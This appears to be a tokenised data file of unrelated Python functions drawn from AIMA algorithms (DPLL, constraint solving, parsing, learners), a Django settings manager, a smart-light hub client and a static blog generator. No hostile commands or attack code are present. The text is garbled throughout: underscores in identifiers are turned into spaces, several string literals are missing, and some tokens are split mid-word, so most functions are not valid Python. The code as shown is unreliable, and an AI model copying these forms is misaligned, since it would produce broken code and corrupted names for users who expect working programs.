def eq ( result , expected , msg = None ) : params = { 'expected' : expected , 'result' : result } aka = % params default msg = % params if ( ( repr ( result ) != six . text type ( result ) ) or ( repr ( expected ) != six . text type ( expected ) ) ) : default msg += aka assertion msg = msg or default msg # This assert will bubble up to Nose's failure handling, which at some # point calls explicit str() - which will Unicode Decode Error on any non # ASCII text. # To work around this, we make sure Unicode strings become bytestrings # beforehand, with explicit encode. if isinstance ( assertion msg , six . text type ) : assertion msg = assertion msg . encode ( 'utf-8' ) assert result == expected , assertion msg
def dem procesa datos dia ( key day , response ) : dfs import , df import , dfs maxmin , hay errores = [ ] , None , [ ] , 0 for r in response : tipo datos , data = extract func json data ( r ) if tipo datos is not None : if ( 'IND Max Min' in tipo datos ) and data : df import = import daily max min ( data ) dfs maxmin . append ( df import ) elif data : df import = import json ts data ( data ) dfs import . append ( df import ) if tipo datos is None or df import is None : hay errores += 1 if hay errores == 4 : # No hay nada, salida temprana sin retry: print redb ( '** No hay datos para el da {}!'. f ormat( k ey day) ) return None , - 2 else : # if hay errores < 3: # TODO formar datos incompletos!! (max-min con Na N's, etc.) data import = { } if dfs import : data import [ KEYS DATA DEM [ 0 ] ] = dfs import [ 0 ] . join ( dfs import [ 1 ] ) if len ( dfs maxmin ) == 2 : data import [ KEYS DATA DEM [ 1 ] ] = dfs maxmin [ 0 ] . join ( dfs maxmin [ 1 ] ) elif dfs maxmin : data import [ KEYS DATA DEM [ 1 ] ] = dfs maxmin [ 0 ] if not data import : print err ( 'DA: {} -> # ERRORES: {}'. f ormat( k ey day,   ay errores) ) return None , - 2 return data import , 0
def compress ( self , input str ) : compressed bits = c String IO . String IO ( ) f = gzip . Gzip File ( fileobj = compressed bits , mode = 'wb' ) f . write ( input str ) f . close ( ) return compressed bits . getvalue ( )
def register Good Class ( self , class ) : # Class itself added to "good" list self . valid classes . append ( class ) # Recurse into any inner classes for name , cls in class members ( class ) : if self . is Valid Class ( cls ) : self . register Good Class ( cls )
def get resample data ( self ) : if self . data is not None : if self . pvpc mean daily is None : self . pvpc mean daily = self . data [ 'data' ] . resample ( 'D' ) . mean ( ) if self . pvpc mean monthly is None : self . pvpc mean monthly = self . data [ 'data' ] . resample ( 'MS' ) . mean ( ) return self . pvpc mean daily , self . pvpc mean monthly
def move dot ( self ) : return self . class ( self . production , self . pos + 1 , self . lookahead )
def first ( self , symbols ) : ret = set ( ) if EPSILON in symbols : return set ( [ EPSILON ] ) for symbol in symbols : ret |= self . first [ symbol ] - set ( [ EPSILON ] ) if EPSILON not in self . first [ symbol ] : break else : ret . add ( EPSILON ) return ret
def initial closure ( self ) : first rule = Dotted Rule ( self . start , 0 , END OF INPUT ) return self . closure ( [ first rule ] )
def parse definite clause ( s ) : assert is definite clause ( s ) if is symbol ( s . op ) : return [ ] , s else : antecedent , consequent = s . args return conjuncts ( antecedent ) , consequent
def tt check all ( kb , alpha , symbols , model ) : if not symbols : if pl true ( kb , model ) : result = pl true ( alpha , model ) assert result in ( True , False ) return result else : return True else : P , rest = symbols [ 0 ] , symbols [ 1 : ] return ( tt check all ( kb , alpha , rest , extend ( model , P , True ) ) and tt check all ( kb , alpha , rest , extend ( model , P , False ) ) )
def prop symbols ( x ) : if not isinstance ( x , Expr ) : return [ ] elif is prop symbol ( x . op ) : return [ x ] else : return list ( set ( symbol for arg in x . args for symbol in prop symbols ( arg ) ) )
def dpll ( clauses , symbols , model ) : unknown clauses = [ ] ## clauses with an unknown truth value for c in clauses : val = pl true ( c , model ) if val == False : return False if val != True : unknown clauses . append ( c ) if not unknown clauses : return model P , value = find pure symbol ( symbols , unknown clauses ) if P : return dpll ( clauses , removeall ( P , symbols ) , extend ( model , P , value ) ) P , value = find unit clause ( clauses , model ) if P : return dpll ( clauses , removeall ( P , symbols ) , extend ( model , P , value ) ) P , symbols = symbols [ 0 ] , symbols [ 1 : ] return ( dpll ( clauses , symbols , extend ( model , P , True ) ) or dpll ( clauses , symbols , extend ( model , P , False ) ) )
def is variable ( x ) : return isinstance ( x , Expr ) and not x . args and is var symbol ( x . op )
def retract ( self , sentence ) : for c in conjuncts ( to cnf ( sentence ) ) : if c in self . clauses : self . clauses . remove ( c )
def refresh ( self ) : # `values list('name', 'value')` doesn't work because `value` is not a # setting (base class) field, it's a setting value (subclass) field. So # we have to get real instances. args = [ ( obj . name , obj . value ) for obj in self . queryset . all ( ) ] super ( Setting Dict , self ) . update ( args ) self . empty cache = False
def utility ( self , state , player ) : return if ( player == 'X' , state . utility , - state . utility )
def compute utility ( self , board , move , player ) : if ( self . k in row ( board , move , player , ( 0 , 1 ) ) or self . k in row ( board , move , player , ( 1 , 0 ) ) or self . k in row ( board , move , player , ( 1 , - 1 ) ) or self . k in row ( board , move , player , ( 1 , 1 ) ) ) : return if ( player == 'X' , + 1 , - 1 ) else : return 0
def k in row ( self , board , move , player , ( delta x , delta y ) ) : x , y = move n = 0 # n is number of moves in row while board . get ( ( x , y ) ) == player : n += 1 x , y = x + delta x , y + delta y x , y = move while board . get ( ( x , y ) ) == player : n += 1 x , y = x - delta x , y - delta y n -= 1 # Because we counted move itself twice return n >= self . k
def weighted sampler ( seq , weights ) : totals = [ ] for w in weights : totals . append ( w + totals [ - 1 ] if totals else w ) return lambda : seq [ bisect . bisect ( totals , random . uniform ( 0 , totals [ - 1 ] ) ) ]
def name ( object ) : return ( getattr ( object , 'name' , 0 ) or getattr ( object , ' name ' , 0 ) or getattr ( getattr ( object , ' class ' , 0 ) , ' name ' , 0 ) or str ( object ) )
def AIMA File ( components , mode = 'r' ) : import utils dir = os . path . dirname ( utils . file ) return open ( apply ( os . path . join , [ dir ] + components ) , mode )
def information content ( values ) : probabilities = normalize ( removeall ( 0 , values ) ) return sum ( - p * log2 ( p ) for p in probabilities )
def Neural Net Learner ( dataset , sizes ) : activations = map ( lambda n : [ 0.0 for i in range ( n ) ] , sizes ) weights = [ ] def predict ( example ) : unimplemented ( ) return predict
def Ensemble Learner ( learners ) : def train ( dataset ) : predictors = [ learner ( dataset ) for learner in learners ] def predict ( example ) : return mode ( predictor ( example ) for predictor in predictors ) return predict return train
def Weighted Majority ( predictors , weights ) : def predict ( example ) : return weighted mode ( ( predictor ( example ) for predictor in predictors ) , weights ) return predict
def replicated dataset ( dataset , weights , n = None ) : n = n or len ( dataset . examples ) result = copy . copy ( dataset ) result . examples = weighted replicate ( dataset . examples , weights , n ) return result
def leave1out ( learner , dataset ) : return cross validation ( learner , dataset , k = len ( dataset . examples ) )
def Synthetic Restaurant ( n = 20 ) : def gen ( ) : example = map ( random . choice , restaurant . values ) example [ restaurant . target ] = Fig [ 18 , 2 ] ( example ) return example return Restaurant Data Set ( [ gen ( ) for i in range ( n ) ] )
def check me ( self ) : assert len ( self . attrnames ) == len ( self . attrs ) assert self . target in self . attrs assert self . target not in self . inputs assert set ( self . inputs ) . issubset ( set ( self . attrs ) ) map ( self . check example , self . examples )
def add example ( self , example ) : self . check example ( example ) self . examples . append ( example )
def check example ( self , example ) : if self . values : for a in self . attrs : if example [ a ] not in self . values [ a ] : raise Value Error ( 'Bad value %s for attribute %s in %s' % ( example [ a ] , self . attrnames [ a ] , example ) )
def attrnum ( self , attr ) : if attr < 0 : return len ( self . attrs ) + attr elif isinstance ( attr , str ) : return self . attrnames . index ( attr ) else : return attr
def sanitize ( self , example ) : return [ attr i if i in self . inputs else None for i , attr i in enumerate ( example ) ]
def add ( self , o ) : self . smooth for ( o ) self . dictionary [ o ] += 1 self . n obs += 1 self . sampler = None
def sample ( self ) : if self . sampler is None : self . sampler = weighted sampler ( self . dictionary . keys ( ) , self . dictionary . values ( ) ) return self . sampler ( )
def revise ( csp , Xi , Xj , removals ) : revised = False for x in csp . curr domains [ Xi ] [ : ] : # If Xi=x conflicts with Xj=y for every possible y, eliminate Xi=x if every ( lambda y : not csp . constraints ( Xi , x , Xj , y ) , csp . curr domains [ Xj ] ) : csp . prune ( Xi , x , removals ) revised = True return revised
def mrv ( assignment , csp ) : return argmin random tie ( [ v for v in csp . vars if v not in assignment ] , lambda var : num legal values ( csp , var , assignment ) )
def lcv ( var , assignment , csp ) : return sorted ( csp . choices ( var ) , key = lambda val : csp . nconflicts ( var , val , assignment ) )
def forward checking ( csp , var , value , assignment , removals ) : for B in csp . neighbors [ var ] : if B not in assignment : for b in csp . curr domains [ B ] [ : ] : if not csp . constraints ( var , value , B , b ) : csp . prune ( B , b , removals ) if not csp . curr domains [ B ] : return False return True
def mac ( csp , var , value , assignment , removals ) : return AC3 ( csp , [ ( X , var ) for X in csp . neighbors [ var ] ] , removals )
def min conflicts ( csp , max steps = 100000 ) : # Generate a complete assignment for all vars (probably with conflicts) csp . current = current = { } for var in csp . vars : val = min conflicts value ( csp , var , current ) csp . assign ( var , val , current ) # Now repeatedly choose a random conflicted variable and change it for i in range ( max steps ) : conflicted = csp . conflicted vars ( current ) if not conflicted : return current var = random . choice ( conflicted ) val = min conflicts value ( csp , var , current ) csp . assign ( var , val , current ) return None
def Zebra ( ) : Colors = 'Red Yellow Blue Green Ivory' . split ( ) Pets = 'Dog Fox Snails Horse Zebra' . split ( ) Drinks = 'OJ Tea Coffee Milk Water' . split ( ) Countries = 'Englishman Spaniard Norwegian Ukranian Japanese' . split ( ) Smokes = 'Kools Chesterfields Winston Lucky Strike Parliaments' . split ( ) vars = Colors + Pets + Drinks + Countries + Smokes domains = { } for var in vars : domains [ var ] = range ( 1 , 6 ) domains [ 'Norwegian' ] = [ 1 ] domains [ 'Milk' ] = [ 3 ] neighbors = parse neighbors ( , vars ) for type in [ Colors , Pets , Drinks , Countries , Smokes ] : for A in type : for B in type : if A != B : if B not in neighbors [ A ] : neighbors [ A ] . append ( B ) if A not in neighbors [ B ] : neighbors [ B ] . append ( A ) def zebra constraint ( A , a , B , b , recurse = 0 ) : same = ( a == b ) next to = abs ( a - b ) == 1 if A == 'Englishman' and B == 'Red' : return same if A == 'Spaniard' and B == 'Dog' : return same if A == 'Chesterfields' and B == 'Fox' : return next to if A == 'Norwegian' and B == 'Blue' : return next to if A == 'Kools' and B == 'Yellow' : return same if A == 'Winston' and B == 'Snails' : return same if A == 'Lucky Strike' and B == 'OJ' : return same if A == 'Ukranian' and B == 'Tea' : return same if A == 'Japanese' and B == 'Parliaments' : return same if A == 'Kools' and B == 'Horse' : return next to if A == 'Coffee' and B == 'Green' : return same if A == 'Green' and B == 'Ivory' : return ( a - 1 ) == b if recurse == 0 : return zebra constraint ( B , b , A , a , 1 ) if ( ( A in Colors and B in Colors ) or ( A in Pets and B in Pets ) or ( A in Drinks and B in Drinks ) or ( A in Countries and B in Countries ) or ( A in Smokes and B in Smokes ) ) : return not same raise 'error' return CSP ( vars , domains , neighbors , zebra constraint )
def nconflicts ( self , var , val , assignment ) : # Subclasses may implement this more efficiently def conflict ( var2 ) : return ( var2 in assignment and not self . constraints ( var , val , var2 , assignment [ var2 ] ) ) return count if ( conflict , self . neighbors [ var ] )
def suppose ( self , var , value ) : self . support pruning ( ) removals = [ ( var , a ) for a in self . curr domains [ var ] if a != value ] self . curr domains [ var ] = [ value ] return removals
def prune ( self , var , value , removals ) : self . curr domains [ var ] . remove ( value ) if removals is not None : removals . append ( ( var , value ) )
def infer assignment ( self ) : self . support pruning ( ) return dict ( ( v , self . curr domains [ v ] [ 0 ] ) for v in self . vars if 1 == len ( self . curr domains [ v ] ) )
def restore ( self , removals ) : for B , b in removals : self . curr domains [ B ] . append ( b )
def conflicted vars ( self , current ) : return [ var for var in self . vars if self . nconflicts ( var , current [ var ] , current ) > 0 ]
def assign ( self , var , val , assignment ) : oldval = assignment . get ( var , None ) if val != oldval : if oldval is not None : # Remove old val if there was one self . record conflict ( assignment , var , oldval , - 1 ) self . record conflict ( assignment , var , val , + 1 ) CSP . assign ( self , var , val , assignment )
def record conflict ( self , assignment , var , val , delta ) : n = len ( self . vars ) self . rows [ val ] += delta self . downs [ var + val ] += delta self . ups [ var - val + n - 1 ] += delta
def encode ( plaintext , code ) : from string import maketrans trans = maketrans ( alphabet + alphabet . upper ( ) , code + code . upper ( ) ) return plaintext . translate ( trans )
def index collection ( self , filenames ) : for filename in filenames : self . index document ( open ( filename ) . read ( ) , filename )
def index document ( self , text , url ) : ## For now, use first line for title title = text [ : text . index ( '\n' ) ] . strip ( ) docwords = words ( text ) docid = len ( self . documents ) self . documents . append ( Document ( title , url , len ( docwords ) ) ) for word in docwords : if word not in self . stopwords : self . index [ word ] [ docid ] += 1
def score ( self , word , docid ) : ## There are many options; here we take a very simple approach return ( math . log ( 1 + self . index [ word ] [ docid ] ) / math . log ( 1 + self . documents [ docid ] . nwords ) )
def present ( self , results ) : for ( score , d ) in results : doc = self . documents [ d ] print ( "%5.2f|%25s | %s" % ( 100 * score , doc . url , doc . title [ : 45 ] . expandtabs ( ) ) )
def present results ( self , query text , n = 10 ) : self . present ( self . query ( query text , n ) )
def score ( self , plaintext ) : s = 1.0 for bi in bigrams ( plaintext ) : s = s * self . P2 [ bi ] return s
def decode ( self , ciphertext ) : self . ciphertext = ciphertext problem = Permutation Decoder Problem ( decoder = self ) return search . best first tree search ( problem , lambda node : self . score ( node . state ) )
def get value ( self , context , default ) : if default is None : settings = self . setting model . objects . as dict ( ) else : settings = self . setting model . objects . as dict ( default = default ) return settings
def get value ( self , context , name , default ) : settings = self . setting model . objects . filter ( name = name ) if default is None : settings = settings . as dict ( ) else : settings = settings . as dict ( default = default ) value = settings [ name ] return value
def render tag ( self , context , name , nodelist ) : # Use `try` and `except` instead of `setdefault()` so we can skip # rendering the nodelist when the setting already exists. settings = self . setting model . objects . filter ( name = name ) . as dict ( ) try : value = settings [ name ] except Key Error : value = settings [ name ] = nodelist . render ( context ) return value
def expected utility ( a , s , U , mdp ) : return sum ( [ p * U [ s1 ] for ( p , s1 ) in mdp . T ( s , a ) ] )
def go ( self , state , direction ) : state1 = vector add ( state , direction ) return if ( state1 in self . states , state1 , state )
def as dict ( self , default = None ) : settings = Setting Dict ( queryset = self , default = default ) return settings
def create ( self , name , value ) : if value is None : raise Value Error ( 'Setting value cannot be `None`.' ) model = Setting . get model for value ( value ) # Call `create()` method on the super class to avoid recursion. obj = super ( Setting Query Set , model . objects . all ( ) ) . create ( name = name , value = value ) return obj
def exp schedule ( k = 20 , lam = 0.005 , limit = 100 ) : return lambda t : if ( t < limit , k * math . exp ( - lam * t ) , 0 )
def print boggle ( board ) : n2 = len ( board ) n = exact sqrt ( n2 ) for i in range ( n2 ) : if i % n == 0 and i > 0 : print if board [ i ] == 'Q' : print 'Qu' , else : print str ( board [ i ] ) + ' ' , print
def exact sqrt ( n2 ) : n = int ( math . sqrt ( n2 ) ) assert n * n == n2 return n
def expand ( self , problem ) : return [ self . child node ( problem , action ) for action in problem . actions ( self . state ) ]
def child node ( self , problem , action ) : next = problem . result ( self . state , action ) return Node ( next , self , action , problem . path cost ( self . path cost , self . state , action , next ) )
def path ( self ) : node , path back = self , [ ] while node : path back . append ( node ) node = node . parent return list ( reversed ( path back ) )
def mate ( self , other ) : c = random . randrange ( len ( self . genes ) ) return self . class ( self . genes [ : c ] + other . genes [ c : ] )
def make undirected ( self ) : for a in self . dict . keys ( ) : for ( b , distance ) in self . dict [ a ] . items ( ) : self . connect1 ( b , a , distance )
def connect1 ( self , A , B , distance ) : self . dict . setdefault ( A , { } ) [ B ] = distance
def h ( self , node ) : locs = getattr ( self . graph , 'locations' , None ) if locs : return int ( distance ( locs [ node . state ] , locs [ self . goal ] ) ) else : return infinity
def actions ( self , state ) : if state [ - 1 ] is not None : return [ ] # All columns filled; no successors else : col = state . index ( None ) return [ row for row in range ( self . N ) if not self . conflicted ( state , row , col ) ]
def result ( self , state , row ) : col = state . index ( None ) new = state [ : ] new [ col ] = row return new
def set board ( self , board = None ) : if board is None : board = random boggle ( ) self . board = board self . neighbors = boggle neighbors ( len ( board ) ) self . found = { } for i in range ( len ( board ) ) : lo , hi = self . wordlist . bounds [ board [ i ] ] self . find ( lo , hi , i , [ ] , '' ) return self
def score ( self ) : return sum ( [ self . scores [ len ( w ) ] for w in self . words ( ) ] )
def Model Based Vacuum Agent ( ) : model = { loc A : None , loc B : None } def program ( ( location , status ) ) : "Same as Reflex Vacuum Agent, except if everything is clean, do No Op." model [ location ] = status ## Update the model here if model [ loc A ] == model [ loc B ] == 'Clean' : return 'No Op' elif status == 'Dirty' : return 'Suck' elif location == loc A : return 'Right' elif location == loc B : return 'Left' return Agent ( program )
def run ( self , steps = 1000 ) : for step in range ( steps ) : if self . is done ( ) : return self . step ( )
def list things at ( self , location , tclass = Thing ) : return [ thing for thing in self . things if thing . location == location and isinstance ( thing , tclass ) ]
def delete thing ( self , thing ) : try : self . things . remove ( thing ) except Value Error , e : print e print "  in Environment delete thing" print "  Thing to be removed: %s at %s" % ( thing , thing . location ) print "  from list: %s" % [ ( thing , thing . location ) for thing in self . things ] if thing in self . agents : self . agents . remove ( thing )
def things near ( self , location , radius = None ) : if radius is None : radius = self . perceptible distance radius2 = radius * radius return [ thing for thing in self . things if distance2 ( location , thing . location ) <= radius2 ]
def percept ( self , agent ) : return [ self . thing percept ( thing , agent ) for thing in self . things near ( agent . location ) ]
def move to ( self , thing , destination ) : thing . bump = self . some things at ( destination , Obstacle ) if not thing . bump : thing . location = destination for o in self . observers : o . thing moved ( thing )
def add walls ( self ) : for x in range ( self . width ) : self . add thing ( Wall ( ) , ( x , 0 ) ) self . add thing ( Wall ( ) , ( x , self . height - 1 ) ) for y in range ( self . height ) : self . add thing ( Wall ( ) , ( 0 , y ) ) self . add thing ( Wall ( ) , ( self . width - 1 , y ) )
def add edge ( self , edge ) : start , end , lhs , found , expects = edge if edge not in self . chart [ end ] : self . chart [ end ] . append ( edge ) if self . trace : print '%10s: added %s' % ( caller ( 2 ) , edge ) if not expects : self . extender ( edge ) else : self . predictor ( edge )
def scanner ( self , j , word ) : for ( i , j , A , alpha , Bb ) in self . chart [ j ] : if Bb and self . grammar . isa ( word , Bb [ 0 ] ) : self . add edge ( [ i , j + 1 , A , alpha + [ ( Bb [ 0 ] , word ) ] , Bb [ 1 : ] ] )
def predictor ( self , ( i , j , A , alpha , Bb ) ) : B = Bb [ 0 ] if B in self . grammar . rules : for rhs in self . grammar . rewrites for ( B ) : self . add edge ( [ j , j , B , [ ] , rhs ] )
def extender ( self , edge ) : ( j , k , B , , ) = edge for ( i , j , A , alpha , B1b ) in self . chart [ j ] : if B1b and B == B1b [ 0 ] : self . add edge ( [ i , k , A , alpha + [ edge ] , B1b [ 1 : ] ] )
def sum out ( var , factors , bn ) : result , var factors = [ ] , [ ] for f in factors : ( var factors if var in f . vars else result ) . append ( f ) result . append ( pointwise product ( var factors , bn ) . sum out ( var , bn ) ) return result
def all events ( vars , bn , e ) : if not vars : yield e else : X , rest = vars [ 0 ] , vars [ 1 : ] for e1 in all events ( rest , bn , e ) : for x in bn . variable values ( X ) : yield extend ( e1 , X , x )
def consistent with ( event , evidence ) : return every ( lambda ( k , v ) : evidence . get ( k , v ) == v , event . items ( ) )
def pointwise product ( self , other , bn ) : vars = list ( set ( self . vars ) | set ( other . vars ) ) cpt = dict ( ( event values ( e , vars ) , self . p ( e ) * other . p ( e ) ) for e in all events ( vars , bn , { } ) ) return Factor ( vars , cpt )
def sum out ( self , var , bn ) : vars = [ X for X in self . vars if X != var ] cpt = dict ( ( event values ( e , vars ) , sum ( self . p ( extend ( e , var , val ) ) for val in bn . variable values ( var ) ) ) for e in all events ( vars , bn , { } ) ) return Factor ( vars , cpt )
def normalize ( self ) : assert len ( self . vars ) == 1 return Prob Dist ( self . vars [ 0 ] , dict ( ( k , v ) for ( ( k , ) , v ) in self . cpt . items ( ) ) )
def brightness ( level = 100 , group = 0 ) : if level not in range ( 0 , 101 ) : raise Exception ( "Brightness must be value between 0 and 100" ) b = int ( floor ( level / 4.0 ) + 2 ) #lights want values 2-27 return ( COMMANDS [ 'ON' ] [ group ] , Command ( 0x4E , b ) )
def brightness ( level = 100 , group = 0 ) : if level not in range ( 0 , 101 ) : raise Exception ( "Brightness must be value between 0 and 100" ) b = int ( floor ( level / 10.0 ) ) #lights have 10 levels of brightness commands = list ( darkest ( group ) ) for i in range ( 0 , b ) : commands . append ( COMMANDS [ 'BRIGHTER' ] ) return tuple ( commands )
def warmness ( level = 100 , group = 0 ) : if level not in range ( 0 , 101 ) : raise Exception ( "Warmness must be value between 0 and 100" ) b = int ( floor ( level / 10.0 ) ) #lights have 10 levels of warmness commands = list ( coolest ( group ) ) for i in range ( 0 , b ) : commands . append ( COMMANDS [ 'WARMER' ] ) return tuple ( commands )
def getpassword ( prompt = "Password: " ) : fd = sys . stdin . fileno ( ) old = termios . tcgetattr ( fd ) new = termios . tcgetattr ( fd ) new [ 3 ] &= ~ termios . ECHO # lflags try : termios . tcsetattr ( fd , termios . TCSADRAIN , new ) passwd = raw input ( prompt ) finally : termios . tcsetattr ( fd , termios . TCSADRAIN , old ) return passwd
def getch ( ) : try : termios . tcsetattr ( fd , termios . TCSANOW , new settings ) ch = sys . stdin . read ( 1 ) finally : termios . tcsetattr ( fd , termios . TCSADRAIN , old settings ) return ch
def format ( self , record ) : try : record . message = record . get Message ( ) except Type Error : # if error during msg = msg % self.args if record . args : if isinstance ( record . args , collections . Mapping ) : record . message = record . msg . format ( * * record . args ) else : record . message = record . msg . format ( record . args ) self . fmt = self . getfmt ( record . levelname ) if self . uses Time ( ) : record . asctime = self . format Time ( record , self . datefmt ) s = self . fmt . format ( * * record . dict ) if record . exc info : # Cache the traceback text to avoid converting it multiple times # (it's constant anyway) if not record . exc text : record . exc text = self . format Exception ( record . exc info ) if record . exc text : if s [ - 1 : ] != '\n' : s += '\n' try : s = s + record . exc text except Unicode Error : s = s + record . exc text . decode ( sys . getfilesystemencoding ( ) , 'replace' ) return s
def connect ( self ) : try : self . socket = socket . socket ( socket . AF INET , socket . SOCK STREAM ) self . socket . settimeout ( TIMEOUT SECONDS ) self . socket . connect ( ( self . ip , self . port ) ) LOGGER . debug ( "Successfully created Hub at %s:%s :)" , self . ip , self . port ) except socket . error as error : LOGGER . error ( "Error creating Hub: %s :(" , error ) self . socket . close ( )
def send command ( self , command ) : # use lock to make TCP send/receive thread safe with self . lock : try : self . socket . send ( command . encode ( "utf8" ) ) result = self . receive ( ) # hub may send "status"/"new" messages that should be ignored while result . startswith ( "S" ) or result . startswith ( "NEW" ) : LOGGER . debug ( "!Got response: %s" , result ) result = self . receive ( ) LOGGER . debug ( "Received: %s" , result ) return result except socket . error as error : LOGGER . error ( "Error sending command: %s" , error ) # try re-connecting socket self . connect ( ) return ""
def receive ( self ) : try : buffer = self . socket . recv ( BUFFER SIZE ) except socket . timeout as error : # Something is wrong, assume it's offline temporarily LOGGER . error ( "Error receiving: %s" , error ) # self. socket.close() return "" # Read until a newline or timeout buffering = True response = '' while buffering : if '\n' in buffer . decode ( "utf8" ) : response = buffer . decode ( "utf8" ) . split ( '\n' ) [ 0 ] buffering = False else : try : more = self . socket . recv ( BUFFER SIZE ) except socket . timeout : more = None if not more : buffering = False response = buffer . decode ( "utf8" ) else : buffer += more return response
def get data ( self ) : response = self . send command ( GET LIGHTS COMMAND ) LOGGER . debug ( "get data response: %s" , repr ( response ) ) if not response : LOGGER . debug ( "Empty response: %s" , response ) return { } response = response . strip ( ) # Check string before splitting (avoid Index Error if malformed) if not ( response . startswith ( "GLB" ) and response . endswith ( ";" ) ) : LOGGER . debug ( "Invalid response: %s" , repr ( response ) ) return { } # deconstruct response string into light data. Example data: # GLB 143E,1,1,25,255,255,255,0,0;287B,1,1,22,255,255,255,0,0;\r\n response = response [ 4 : - 3 ] # strip start (GLB) and end (;\r\n) light strings = response . split ( ';' ) light data by id = { } for light string in light strings : values = light string . split ( ',' ) try : light data by id [ values [ 0 ] ] = [ int ( values [ 2 ] ) , int ( values [ 4 ] ) , int ( values [ 5 ] ) , int ( values [ 6 ] ) , int ( values [ 7 ] ) ] except Value Error as error : LOGGER . error ( "Error %s: %s (%s)" , error , values , response ) except Index Error as error : LOGGER . error ( "Error %s: %s (%s)" , error , values , response ) return light data by id
def get lights ( self ) : # Throttle updates. Use cached data if within UPDATE INTERVAL SECONDS now = datetime . datetime . now ( ) if ( now - self . last updated ) < datetime . timedelta ( seconds = UPDATE INTERVAL SECONDS ) : #  LOGGER.debug("Using cached light data") return self . bulbs else : self . last updated = now light data = self . get data ( ) LOGGER . debug ( "got: %s" , light data ) if not light data : return [ ] if self . bulbs : # Bulbs already created, just update values for bulb in self . bulbs : # use the values for the bulb with the correct ID try : values = light data [ bulb . zid ] bulb . online , bulb . red , bulb . green , bulb . blue , bulb . level = values except Key Error : pass else : for light id in light data : self . bulbs . append ( Bulb ( self , light id , * light data [ light id ] ) ) # return a list of Bulb objects return self . bulbs
def set brightness ( self , brightness ) : command = "C {},,,,{},\r\n" . format ( self . zid , brightness ) response = self . hub . send command ( command ) LOGGER . debug ( "Set brightness %s: %s" , repr ( command ) , response ) return response
def set all ( self , red , green , blue , brightness ) : command = "C {},{},{},{},{},\r\n" . format ( self . zid , red , green , blue , brightness ) response = self . hub . send command ( command ) LOGGER . debug ( "Set all %s: %s" , repr ( command ) , response ) return response
def update ( self ) : bulbs = self . hub . get lights ( ) if not bulbs : LOGGER . debug ( "%s is offline, send command failed" , self . zid ) self . online = False
def readtxt ( filepath ) : with open ( filepath , 'rt' ) as f : lines = f . readlines ( ) return '' . join ( lines )
def modulename ( cls , depth = 1 ) : depth += cls . extra depth frame = sys . getframe ( depth ) return frame . f globals [ ' name ' ]
def snoise2d ( size , z = 0.0 , scale = 0.05 , octaves = 1 , persistence = 0.25 , lacunarity = 2.0 ) : import noise data = np . empty ( size , dtype = 'float32' ) for y in range ( size [ 0 ] ) : for x in range ( size [ 1 ] ) : v = noise . snoise3 ( x * scale , y * scale , z , octaves = octaves , persistence = persistence , lacunarity = lacunarity ) data [ x , y ] = v data = data * 0.5 + 0.5 if debug : assert data . min ( ) >= 0. and data . max ( ) <= 1.0 return data
def guess package path ( searchfrom ) : from snipy . io import fileutil current = searchfrom + '/' init found = False pack found = False while not init found and current != '/' : current = os . path . dirname ( current ) initfile = os . path . join ( current , ' init .py' ) init found = os . path . exists ( initfile ) if not init found : # search for breadth searchfrom = dirname ( searchfrom ) for folder in fileutil . listfolder ( searchfrom ) : current = os . path . join ( searchfrom , folder ) initfile = os . path . join ( current , ' init .py' ) init found = os . path . exists ( initfile ) if init found : break while init found : current = os . path . dirname ( current ) initfile = os . path . join ( current , ' init .py' ) init found = os . path . exists ( initfile ) pack found = not init found return current if pack found else None
def find package path ( searchfrom ) : current = searchfrom + '/' init found = False pack found = False while not init found and current != '/' : current = os . path . dirname ( current ) initfile = os . path . join ( current , ' init .py' ) init found = os . path . exists ( initfile ) while init found : current = os . path . dirname ( current ) initfile = os . path . join ( current , ' init .py' ) init found = os . path . exists ( initfile ) pack found = not init found return current if pack found else None
def git tag ( tag ) : print ( 'Tagging "{}"' . format ( tag ) ) msg = '"Released version {}"' . format ( tag ) Popen ( [ 'git' , 'tag' , '-s' , '-m' , msg , tag ] ) . wait ( )
def render to ( self , path , template , * * data ) : html = self . render ( template , * * data ) with open ( path , 'w' ) as f : f . write ( html . encode ( charset ) )
def index row ( self , dataframe ) : return dataframe . loc [ self . kwargs [ self . lookup url kwarg ] ] . to frame ( ) . T
def paginator ( self ) : if not hasattr ( self , ' paginator' ) : if self . pagination class is None : self . paginator = None else : self . paginator = self . pagination class ( ) return self . paginator
def paginate dataframe ( self , dataframe ) : if self . paginator is None : return None return self . paginator . paginate dataframe ( dataframe , self . request , view = self )
def parse ( self ) : if exists ( self . filepath ) : content = open ( self . filepath ) . read ( ) . decode ( charset ) else : content = "" try : config = toml . loads ( content ) except toml . Toml Syntax Error : raise Config Syntax Error return config
def parse ( self , source ) : rt , title , title pic , markdown = libparser . parse ( source ) if rt == - 1 : raise Separator Not Found elif rt == - 2 : raise Post Title Not Found # change to unicode title , title pic , markdown = map ( to unicode , ( title , title pic , markdown ) ) # render to html html = self . markdown . render ( markdown ) summary = self . markdown . render ( markdown [ : 200 ] ) return { 'title' : title , 'markdown' : markdown , 'html' : html , 'summary' : summary , 'title pic' : title pic }
def parse filename ( self , filepath ) : name = os . path . basename ( filepath ) [ : - src ext len ] try : dt = datetime . strptime ( name , "%Y-%m-%d-%H-%M" ) except Value Error : raise Post Name Invalid return { 'name' : name , 'datetime' : dt , 'filepath' : filepath }
def run server ( self , port ) : try : self . server = Multi Threaded HTTP Server ( ( '0.0.0.0' , port ) , Handler ) except socket . error , e : # failed to bind port logger . error ( str ( e ) ) sys . exit ( 1 ) logger . info ( "HTTP serve at http://0.0.0.0:%d (ctrl-c to stop) ..." % port ) try : self . server . serve forever ( ) except Keyboard Interrupt : logger . info ( "^C received, shutting down server" ) self . shutdown server ( )
def get files stat ( self ) : if not exists ( Post . src dir ) : logger . error ( Source Directory Not Found . doc ) sys . exit ( Source Directory Not Found . exit code ) paths = [ ] for fn in ls ( Post . src dir ) : if fn . endswith ( src ext ) : paths . append ( join ( Post . src dir , fn ) ) # config.toml if exists ( config . filepath ) : paths . append ( config . filepath ) # files: a <filepath to updated time> dict files = dict ( ( p , stat ( p ) . st mtime ) for p in paths ) return files
def deploy blog ( ) : logger . info ( deploy blog . doc ) # `rsync -aqu path/to/res/* .` call ( 'rsync -aqu ' + join ( dirname ( file ) , 'res' , '*' ) + ' .' , shell = True ) logger . success ( 'Done' ) logger . info ( 'Please edit config.toml to meet your needs' )
